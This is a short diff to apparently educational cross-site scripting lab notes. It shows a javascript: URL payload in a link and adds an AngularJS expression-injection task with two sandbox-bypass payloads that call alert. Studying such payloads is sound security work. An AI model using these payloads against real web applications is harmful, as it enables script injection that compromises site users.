@@ -22,4 +22,9 @@ javascript:alert(1)
 Rendered output
 <a href="javascript:alert(1)">YourName</a>
 
-3.
+3.perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function
+
+🧪 Alternative bypass payloads (if filtered)
+{{$eval.constructor('alert(1)')()}}
+
+{{[].filter.constructor('alert(1)')()}}
